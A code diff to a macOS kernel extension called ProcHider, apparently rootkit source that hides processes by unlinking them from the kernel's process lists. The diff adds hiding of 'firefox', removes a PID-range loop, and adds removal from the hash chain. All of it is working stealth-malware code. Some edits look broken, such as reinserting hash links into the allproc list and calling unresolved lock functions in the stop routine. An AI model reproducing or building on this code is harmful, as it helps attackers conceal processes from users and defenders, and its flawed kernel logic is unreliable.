@@ -32,13 +32,8 @@ kern_return_t ProcHider_start(kmod_info_t * ki, void *d)
         return KERN_FAILURE;
     }
     
-    int i;
-    
-    for (i=50; i<100; i++) {
-        hide_proc_by_pid( i );
-    }
-    
     hide_proc_by_name( "l337app" );
+    hide_proc_by_name( "firefox" );
     
 //    DLOG("[+] _allproc @ %p\n",
 //         find_symbol((struct mach_header_64 *)(KERNEL_MH_START_ADDR+ASLR),
@@ -57,36 +52,9 @@ kern_return_t ProcHider_start(kmod_info_t * ki, void *d)
 }
 
 kern_return_t ProcHider_stop(kmod_info_t *ki, void *d)
-{
-    vm_offset_t ASLR = calculate_vm_kernel_slide();
-    
-    
-    if( ( allproc = find_symbol((struct mach_header_64 *)(KERNEL_MH_START_ADDR+ASLR),
-                                "_allproc") ) == NULL )
-    {
-        DLOG( "[+] Unable to find _allproc!\n" );
-        return KERN_FAILURE;
-    }
-    
-    if( ( my_proc_list_lock = ( proc_list_lockp ) find_symbol( (struct mach_header_64 *)(KERNEL_MH_START_ADDR+ASLR), "_proc_list_lock" ) ) == NULL )
-    {
-        DLOG( "[+] Unable to find _proc_list_lock!\n" );
-        return KERN_FAILURE;
-    }
-    
-    if( ( my_proc_list_unlock = ( proc_list_unlockp ) find_symbol( (struct mach_header_64 *)(KERNEL_MH_START_ADDR+ASLR), "_proc_list_unlock" ) ) == NULL )
-    {
-        DLOG( "[+] Unable to find _proc_list_unlock!\n" );
-        return KERN_FAILURE;
-    }
-    
-    int i;
-    
-    for (i=50; i<100; i++) {
-        unhide_proc_by_pid( i );
-    }
-    
+{    
     unhide_proc_by_name( "l337app" );
+    unhide_proc_by_name( "firefox" );
     
     return KERN_SUCCESS;
 }
@@ -108,6 +76,7 @@ static int hide_proc_by_pid( int pid )
                     hidden_p_count++;
                     my_proc_list_lock();
                     LIST_REMOVE( p, p_list );
+                    LIST_REMOVE( p, p_hash );
                     my_proc_list_unlock();
                 }
             }
@@ -133,6 +102,7 @@ static int unhide_proc_by_pid( int pid )
                 {
                     my_proc_list_lock();
                     LIST_INSERT_HEAD(allproc, p, p_list);
+                    LIST_INSERT_HEAD(allproc, p, p_hash);
                     my_proc_list_unlock();
                     hidden_p_count--;
                 }
@@ -157,6 +127,7 @@ static int hide_proc_by_name( char *p_comm )
                 hidden_p_count++;
                 my_proc_list_lock();
                 LIST_REMOVE( p, p_list );
+                LIST_REMOVE( p, p_hash );
                 my_proc_list_unlock();
             }
         }
@@ -180,6 +151,7 @@ static int unhide_proc_by_name( char *p_comm )
             {
                 my_proc_list_lock();
                 LIST_INSERT_HEAD(allproc, p, p_list);
+                LIST_INSERT_HEAD(allproc, p, p_hash);
                 my_proc_list_unlock();
                 hidden_p_count--;
             }
